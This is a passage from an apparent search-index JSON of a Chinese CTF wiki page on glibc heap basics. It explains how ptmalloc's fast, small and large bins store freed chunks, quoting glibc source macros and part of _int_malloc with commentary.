\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u4e0d\u80fd\u5728\u4e00\u8d77 \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \u5148**\u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002**\u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002 bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b typedef struct malloc_chunk * mbinptr ; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) - \\ offsetof(struct malloc_chunk, fd)) /* analog of ++bin */ //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740 #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk #define first(b) ((b)->fd) // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk #define last(b) ((b)->bk)","title":"\u6982\u8ff0"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#fast-bin","text":"\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002**\u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002**\u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk * mfastbinptr ; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; */ \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528**\u5355\u5411\u94fe\u8868**\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7(\u53ea\u4f7f\u7528 fd \u6307\u9488)\uff0c\u5e76\u4e14**\u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565\uff08\u540e\u8fdb\u5148\u51fa\uff09**\uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc \u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002 fast bin \u4e2d\u65e0\u8bba\u662f\u6dfb\u52a0\u8fd8\u662f\u79fb\u9664 fast chunk \uff0c\u90fd\u662f\u5bf9\u201c\u94fe\u8868\u5c3e\u201d\u8fdb\u884c\u64cd\u4f5c\uff0c\u800c\u4e0d\u4f1a\u5bf9\u67d0\u4e2a\u4e2d\u95f4\u7684 fast chunk \u8fdb\u884c\u64cd\u4f5c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a 80 \u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a \uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a 8 \u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u5230 80 \u5b57\u8282\uff08\u6ce8\u610f\u8fd9\u91cc\u8bf4\u7684\u662f\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\uff0c\u4e5f\u5373\u9664\u53bb prev_size \u548c size \u5b57\u6bb5\u90e8\u5206\u7684\u5927\u5c0f\uff09\u5b9a\u4e49\u5982\u4e0b\uff1a #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709 #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // MORECORE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002 // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4 // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) & ~MALLOC_ALIGN_MASK)) #define get_max_fast() global_max_fast ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002 \u90a3\u4e48 malloc \u64cd\u4f5c\u5177\u4f53\u5982\u4f55\u5904\u7406 fast chunk \u5462\uff1f \u5f53\u7528\u6237\u901a\u8fc7 malloc \u8bf7\u6c42\u7684\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5927\u5c0f\u8303\u56f4\uff08\u6ce8\u610f\uff1a\u7528\u6237\u8bf7\u6c42 size \u52a0\u4e0a 16 \u5b57\u8282\u5c31\u662f\u5b9e\u9645\u5185\u5b58 chunk size \uff09\u3002\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019 fast bin \u652f\u6301\u7684\u6700\u5927\u5185\u5b58\u5927\u5c0f\u4ee5\u53ca\u6240\u6709 fast bin \u94fe\u8868\u90fd\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u5f53\u6700\u5f00\u59cb\u4f7f\u7528 malloc \u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\uff0c\u5373\u4f7f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5185\u5b58\u5927\u5c0f\uff08\u5373 16 \u5230 80 \u5b57\u8282\uff09\uff0c\u5b83\u4e5f\u4e0d\u4f1a\u4ea4\u7531 fast bin \u6765\u5904\u7406\uff0c\u800c\u662f\u5411\u4e0b\u4f20\u9012\u4ea4\u7531 small bin \u6765\u5904\u7406\uff0c\u5982\u679c small bin \u4e5f\u4e3a\u7a7a\u7684\u8bdd\u5c31\u4ea4\u7ed9 unsorted bin \u5904\u7406\u3002\u90a3\u4e48 fast bin \u662f\u5728\u54ea\uff1f\u600e\u4e48\u8fdb\u884c\u521d\u59cb\u5316\u7684\u5462\uff1f \u5f53\u6211\u4eec\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u6267\u884c _int_malloc \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u9996\u5148\u4f1a\u53d1\u73b0\u5f53\u524d fast bin \u4e3a\u7a7a\uff0c\u5c31\u8f6c\u4ea4\u7ed9 small bin \u5904\u7406\uff0c\u8fdb\u800c\u53c8\u53d1\u73b0 small bin \u4e5f\u4e3a\u7a7a\uff0c\u5c31\u8c03\u7528 malloc_consolidate \u51fd\u6570\u5bf9 malloc_state \u7ed3\u6784\u4f53\u8fdb\u884c\u521d\u59cb\u5316\uff0c malloc_consolidate \u51fd\u6570\u4e3b\u8981\u5b8c\u6210\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd\uff1a \u9996\u5148\u5224\u65ad\u5f53\u524d malloc_state \u7ed3\u6784\u4f53\u4e2d\u7684 fast bin \u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5c31\u8bf4\u660e\u6574\u4e2a malloc_state \uff08 arena \uff09\u90fd\u6ca1\u6709\u5b8c\u6210\u521d\u59cb\u5316\uff0c\u9700\u8981\u5bf9 malloc_state \u8fdb\u884c\u521d\u59cb\u5316\u3002 malloc_state \u7684\u521d\u59cb\u5316\u64cd\u4f5c\u7531\u51fd\u6570 malloc_init_state(av) \u5b8c\u6210\uff0c\u8be5\u51fd\u6570\u5148\u521d\u59cb\u5316\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709\u7684 bin (\u6784\u5efa\u53cc\u94fe\u8868\uff0c\u8be6\u60c5\u89c1\u540e\u6587 small bins \u4ecb\u7ecd)\uff0c\u518d\u521d\u59cb\u5316 fast bins \u3002 \u5f53\u518d\u6b21\u6267\u884c malloc \u51fd\u6570\u7684\u65f6\u5019\uff0c\u6b64\u65f6 fast bin \u76f8\u5173\u6570\u636e\u4e0d\u4e3a\u7a7a\u4e86\uff0c\u5c31\u5f00\u59cb\u4f7f\u7528 fast bin \uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a static void * _int_malloc ( mstate av , size_t bytes ) { // \u2026 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //\u7b2c\u4e00\u6b21\u6267\u884cmalloc(fast chunk)\u65f6\u8fd9\u91cc\u5224\u65ad\u4e3afalse\uff0c\u56e0\u4e3a\u6b64\u65f6get_max_fast ()\u4e3a0 if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { // use fast bin idx = fastbin_index ( nb ); mfastbinptr * fb = & fastbin ( av , idx ); mchunkptr pp = * fb ; do { victim = pp ; if ( victim == NULL ) break ; } // remove chunk from fast bin while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); if ( victim != 0 ) { if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim )); return NULL ; } check_remalloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } } \u5f97\u5230\u7b2c\u4e00\u4e2a\u6765\u81ea\u4e8e fast bin \u7684 chunk \u4e4b\u540e\uff0c\u7cfb\u7edf\u5c31\u5c06\u8be5 chunk \u4ece\u5bf9\u5e94\u7684 fast bin \u4e2d\u79fb\u9664\uff0c\u5e76\u5c06\u5176\u5730\u5740\u8fd4\u56de\u7ed9\u7528\u6237\u3002 fastbin \u7684\u7d22\u5f15 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002 #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684 chunk \u5408\u5e76\u3002 \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8e FASTBIN_CONSOLIDATION_THRESHOLD \u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684 chunk \u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002 /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) malloc_consolidate \u51fd\u6570\u53ef\u4ee5\u5c06 fastbin \u4e2d\u6240\u6709\u80fd\u548c\u5176\u5b83 chunk \u5408\u5e76\u7684 chunk \u5408\u5e76\u5728\u4e00\u8d77\u3002\u5177\u4f53\u5730\u53c2\u89c1\u540e\u7eed\u7684\u8be6\u7ec6\u51fd\u6570\u7684\u5206\u6790\u3002 /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */","title":"Fast Bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#small-bin","text":"small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size = 2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b \u4e0b\u6807 SIZE_SZ=4\uff0832 \u4f4d\uff09 SIZE_SZ=8\uff0864 \u4f4d\uff09 2 16 32 3 24 48 4 32 64 5 40 80 x 2*4*x 2*8*x 63 504 1008 small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a**\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4**\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff08\u5148\u8fdb\u5148\u51fa\uff09\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002 \u7269\u7406\u5730\u5740\u76f8\u90bb\u7684 free chunk \u9700\u8981\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u5373\u5408\u5e76\u6210\u4e00\u4e2a\u5927\u7684 free chunk \u3002 \u5f53\u91ca\u653e small chunk \u7684\u65f6\u5019\uff0c\u5148\u68c0\u67e5\u8be5 chunk \u76f8\u90bb\u7684 chunk \u662f\u5426\u4e3a free chunk \uff0c\u5982\u679c\u662f\u7684\u8bdd\u5c31\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff1a\u5c06\u8fd9\u4e9b chunk \u5408\u5e76\u6210\u65b0\u7684 chunk \uff0c\u7136\u540e\u5c06\u5b83\u4eec\u4ece small bin \u4e2d\u79fb\u9664\uff0c\u6700\u540e\u5c06\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002 small bin \u76f8\u5173\u7684\u5b8f\u5982\u4e0b #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63 #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185 #define in_smallbin_range(sz) \\ ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE) // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002 #define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) \\ : (((unsigned) (sz)) >> 3)) + \\ SMALLBIN_CORRECTION) \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin \u4e2d\u53bb\u7684\uff0c\u6211\u4eec\u5728\u540e\u9762\u5206\u6790\u5177\u4f53\u7684\u6e90\u4ee3\u7801\u65f6\u4f1a\u6709\u6df1\u523b\u7684\u4f53\u4f1a\u3002","title":"Small Bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#large-bin","text":"large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c \u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185 \u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a \u7ec4 \u6570\u91cf \u516c\u5dee 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 \u4e0d\u9650\u5236 \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5 bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002 \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512>>6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a 56+8=64\u3002 #define largebin_index_32(sz) \\ (((((unsigned long) (sz)) >> 6) <= 38) \\ ? 56 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) >> 6) <= 45) \\ ? 49 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) >> 6) <= 48) \\ ? 48 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) large chunk \u53ef\u4ee5\u6dfb\u52a0\u3001\u5220\u9664\u5728 large bin \u7684\u4efb\u4f55\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u9274\u4e8e\u540c\u4e00\u4e2a large bin \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u5b9a\u76f8\u540c\uff0c\u56e0\u6b64\u4e3a\u4e86\u52a0\u5feb\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u7684\u901f\u5ea6\uff0c\u5c31\u5c06\u540c\u4e00\u4e2a large bin \u4e2d\u7684\u6240\u6709 chunk \u6309\u7167 chunk size \u8fdb\u884c\u4ece\u5927\u5230\u5c0f\u7684\u6392\u5217\uff1a\u6700\u5927\u7684 chunk \u653e\u5728\u94fe\u8868\u7684\u524d\u7aef\uff0c\u6700\u5c0f\u7684 chunk \u653e\u5728\u5c3e\u7aef\u3002 large bin \u7684 free \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u7c7b\u4f3c\u4e8e small bin \u3002 large bin malloc \uff08\u90e8\u5206\uff09\u64cd\u4f5c\uff1a \u5982\u679c\u5c3e\u7aef\u6700\u5c0f\u7684 chunk \u5927\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u7684\u8bdd\uff0c\u5c31\u5c06\u8be5 chunk \u62c6\u5206\u4e3a\u4e24\u4e2a chunk \uff1a\u524d\u8005\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5927\u5c0f\u7b49\u540c\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff1b\u5269\u4f59\u7684\u90e8\u5206\u505a\u4e3a\u4e00\u4e2a\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002","title":"Large 